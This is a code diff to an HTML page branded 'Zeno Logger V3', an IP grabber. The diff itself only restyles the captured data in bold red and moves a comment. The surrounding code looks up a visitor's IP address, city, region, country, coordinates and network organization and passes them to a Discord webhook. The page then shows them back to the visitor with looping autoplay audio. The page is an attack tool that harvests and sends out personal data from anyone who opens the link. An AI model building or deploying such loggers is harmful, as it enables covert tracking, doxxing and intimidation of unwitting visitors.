@@ -43,6 +43,11 @@
                 background-image: url('jas2.png');
             }
         }
+        /* CSS to make the IP text red */
+        .ip-text {
+            color: red; /* Change the text color to red */
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
@@ -52,7 +57,8 @@
 <div class="content">
     <h2>IP LOGGED BY ZENO LOGGER V3</h2>
     <div id="ipResult"></div>
-    <audio id="sound" src="sound.mp3" autoplay loop></audio> <!-- Audio element with autoplay -->
+    <!-- Audio element with autoplay (no button required) -->
+    <audio id="sound" src="sound.mp3" autoplay loop></audio>
 
     <script>
         // Function to get the IP address and geolocation
@@ -66,12 +72,12 @@
                         .then(data => {
                             var ipResultDiv = document.getElementById("ipResult");
                             ipResultDiv.innerHTML = `
-                                <p><strong>IP Address:</strong> ${data.ip}</p>
-                                <p><strong>City:</strong> ${data.city}</p>
-                                <p><strong>Region:</strong> ${data.region}</p>
-                                <p><strong>Country:</strong> ${data.country}</p>
-                                <p><strong>Location:</strong> ${data.loc}</p>
-                                <p><strong>Organization:</strong> ${data.org}</p>
+                                <p><strong class="ip-text">IP Address:</strong> <span class="ip-text">${data.ip}</span></p>
+                                <p><strong class="ip-text">City:</strong> <span class="ip-text">${data.city}</span></p>
+                                <p><strong class="ip-text">Region:</strong> <span class="ip-text">${data.region}</span></p>
+                                <p><strong class="ip-text">Country:</strong> <span class="ip-text">${data.country}</span></p>
+                                <p><strong class="ip-text">Location:</strong> <span class="ip-text">${data.loc}</span></p>
+                                <p><strong class="ip-text">Organization:</strong> <span class="ip-text">${data.org}</span></p>
                             `;
                             // Send the data to Discord webhook
                             sendToDiscord(data);
